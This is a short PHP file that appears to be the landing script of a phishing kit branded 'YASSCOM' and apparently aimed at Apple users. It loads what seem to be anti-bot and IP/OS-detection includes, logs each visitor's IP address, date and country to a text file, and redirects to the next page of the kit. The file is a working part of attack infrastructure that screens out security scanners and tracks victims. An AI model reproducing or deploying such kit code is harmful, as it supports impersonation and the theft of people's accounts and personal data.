<?php
	/*
	#///////////////////////////////////////////////////#
	# __   __ _    ____ ____   ____ ___  __  __  
	# \ \ / // \  / ___/ ___| / ___/ _ \|  \/  | 
	#  \ V // _ \ \___ \___ \| |  | | | | |\/| | 
	#   | |/ ___ \ ___) |__) | |__| |_| | |  | | 
	#   |_/_/   \_\____/____/ \____\___/|_|  |_| 
	#  
	apple
	*/
	error_reporting(E_ERROR | E_PARSE);
	include('XYSANBBX/xanbbx.php');
	include('XYASSCOM_KILLEDX/XYSINCLUDEDX/get_ip.php');
	include('XYASSCOM_KILLEDX/XYSINCLUDEDX/get_os.php');
	include('XYASSCOM_KILLEDX/XYSINCLUDEDX/session_lg.php');
	$YSDIR = fopen("VISITORS.txt","a");
	fwrite($YSDIR, $ipaddress . " | VISITED | " . $DATE . " | " . $country . "\n");
	header('Location: XYSDIRX.php');
?>